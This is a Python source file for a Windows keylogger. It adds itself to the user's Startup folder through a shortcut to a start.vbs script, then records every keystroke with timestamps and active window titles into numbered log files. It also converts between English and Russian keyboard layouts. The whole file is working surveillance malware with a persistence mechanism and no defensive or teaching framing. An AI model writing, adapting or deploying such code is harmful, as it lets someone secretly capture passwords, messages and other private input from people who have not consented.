import datetime
import platform
import os
import getpass
import os.path

from ctypes import *
from datetime import datetime
from pynput.keyboard import Key, Listener
from win32com.client import Dispatch

user32 = windll.user32
USER_NAME = getpass.getuser()
name_last_active_window = ""
file_path = os.path.dirname(os.path.realpath(__file__))
path = r"%s\logs" % file_path
num_files = len([f for f in os.listdir(path)
                if os.path.isfile(os.path.join(path, f))])

hwnd = user32.GetForegroundWindow()
threadID = user32.GetWindowThreadProcessId(hwnd, None)
StartLang = user32.GetKeyboardLayout(threadID)

eng_chars = u"~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
rus_chars = u"ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,"
trans_table_en_ru = dict(zip(eng_chars, rus_chars))
trans_table_ru_en = dict(zip(rus_chars, eng_chars))


def change_en_ru(s):
    return u''.join([trans_table_en_ru.get(c, c) for c in s])


def change_ru_en(s):
    return u''.join([trans_table_ru_en.get(c, c) for c in s])


def add_to_startup():
    startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    path = os.path.join(startup_path, "start.lnk")
    file_path = os.path.dirname(os.path.realpath(__file__))
    target = r"%s\start.vbs" % file_path
    wDir = file_path
    icon = r"%s\start.vbs" % file_path
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = wDir
    shortcut.IconLocation = icon
    shortcut.save()


def get_active_window():
    import win32gui
    window = win32gui.GetForegroundWindow()
    active_window_name = win32gui.GetWindowText(window)
    return active_window_name


def on_press(key):
    print("{0} pressed".format(key))
    write_file(key)


def write_file(key):
    global name_last_active_window
    file = r"%s\log%s.txt" % (path, (num_files + 1))
    f = open(file, "a", encoding='utf-8')
    f.write("\n")
    active_window = str(get_active_window())

    if name_last_active_window != active_window:
        f.write("\n")
        f.write(f"Active window: {active_window}")
        now_time = datetime.now().time().replace(microsecond=0)
        f.write(" ")
        f.write(str(now_time))
        f.write("\n")

    name_last_active_window = active_window
    hwnd = user32.GetForegroundWindow()
    threadID = user32.GetWindowThreadProcessId(hwnd, None)
    CodeLang = user32.GetKeyboardLayout(threadID)
    k = str(key).replace("'", "")
    # 68748313 russian
    # 67706880 english
    if StartLang == 67706880:
        if CodeLang == 68748313 and k.find("Key") == -1:
            k = change_en_ru(k)
    elif StartLang == 68748313:
        if CodeLang == 67706880 and k.find("Key") == -1:
            k = change_ru_en(k)
    now_time = datetime.now().time().replace(microsecond=0)
    f.write(str(now_time))
    f.write(' ')
    f.write(k)
    f.close()


def on_release(key):
    if key == Key.esc:
        return False


def main():
    add_to_startup()
    # add_to_startup(file_path="")
    file = r"%s\log%s.txt" % (path, (num_files + 1))
    f = open(file, "w", encoding='utf-8')
    f.write("Operating system: ")
    f.write(platform.platform())
    f.write("\n")
    now_data = datetime.now().date()
    f.write(str(now_data))


if __name__ == "__main__":
    main()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
